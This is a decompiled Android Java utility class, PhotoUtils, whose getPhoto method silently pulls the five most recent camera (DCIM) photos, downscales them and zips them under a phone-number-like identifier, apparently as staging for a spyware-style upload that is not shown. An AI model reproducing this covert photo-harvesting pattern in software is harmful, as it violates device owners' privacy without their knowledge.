package com.xmpp.client.util;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.Matrix;
import android.net.Uri;
import android.provider.MediaStore.Images.Media;
import android.util.Log;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class PhotoUtils {
    private AppPreferences _appPrefs;
    private Context _context;
    private String _mainnum;
    private int bmpHeight;
    private int bmpWidth;
    private String strDataPath = "";

    public PhotoUtils(Context context, String mainnum) {
        this._appPrefs = new AppPreferences(context);
        this._context = context;
        this._mainnum = mainnum;
    }

    public void getPhoto() {
        String path = "";
        String[] projection = new String[]{"_id", "_data", "datetaken"};
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this._context);
        }
        Cursor c = this._context.getContentResolver().query(Media.EXTERNAL_CONTENT_URI, projection, null, null, "datetaken DESC");
        File f = new File(this.strDataPath + this._mainnum + "MonkeyPhoto/");
        if (!f.exists()) {
            f.mkdirs();
        }
        if (c != null) {
            int i = 0;
            while (c.moveToNext()) {
                try {
                    path = c.getString(1);
                    if (i == 5) {
                        break;
                    }
                    if (path.indexOf("DCIM") >= 0) {
                        String pathname = path.substring(path.lastIndexOf(47) + 1, path.length());
                        File file = new File(this.strDataPath + this._mainnum + "MonkeyPhoto/photo_" + String.valueOf(i + 1) + ".jpg");
                        Uri pathUri = Uri.fromFile(new File(path));
                        Matrix matrix = new Matrix();
                        matrix.postScale(0.05f, 0.05f);
                        Bitmap imageBitmap = DecodeUtils.decode(this._context, pathUri, -1, -1);
                        this.bmpWidth = imageBitmap.getWidth();
                        this.bmpHeight = imageBitmap.getHeight();
                        Bitmap photoBitmap = Bitmap.createBitmap(imageBitmap, 0, 0, this.bmpWidth, this.bmpHeight, matrix, false);
                        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file));
                        photoBitmap.compress(CompressFormat.PNG, 90, bos);
                        bos.flush();
                        bos.close();
                        i++;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    return;
                }
            }
            ZipFolder(this.strDataPath + this._mainnum + "MonkeyPhoto", this.strDataPath + this._mainnum + "MonkeyPhoto.zip");
        }
    }

    public void ZipFolder(String srcFileString, String zipFileString) throws Exception {
        Log.v("XZip", "ZipFolder(String, String)");
        File intputFile = new File(srcFileString);
        if (intputFile.exists()) {
            ZipOutputStream outZip = new ZipOutputStream(new FileOutputStream(zipFileString));
            ZipFiles(intputFile.getParent() + File.separator, intputFile.getName(), outZip);
            outZip.finish();
            outZip.close();
        }
    }

    private void ZipFiles(String folderString, String fileString, ZipOutputStream zipOutputSteam) throws Exception {
        if (zipOutputSteam != null) {
            File file = new File(new StringBuilder(String.valueOf(folderString)).append(fileString).toString());
            if (file.isFile()) {
                ZipEntry zipEntry = new ZipEntry(fileString);
                FileInputStream inputStream = new FileInputStream(file);
                zipOutputSteam.putNextEntry(zipEntry);
                byte[] buffer = new byte[4096];
                while (true) {
                    int len = inputStream.read(buffer);
                    if (len == -1) {
                        zipOutputSteam.closeEntry();
                        return;
                    }
                    zipOutputSteam.write(buffer, 0, len);
                }
            } else {
                String[] fileList = file.list();
                if (fileList.length <= 0) {
                    zipOutputSteam.putNextEntry(new ZipEntry(new StringBuilder(String.valueOf(fileString)).append(File.separator).toString()));
                    zipOutputSteam.closeEntry();
                }
                for (String append : fileList) {
                    ZipFiles(folderString, new StringBuilder(String.valueOf(fileString)).append(File.separator).append(append).toString(), zipOutputSteam);
                }
            }
        }
    }
}
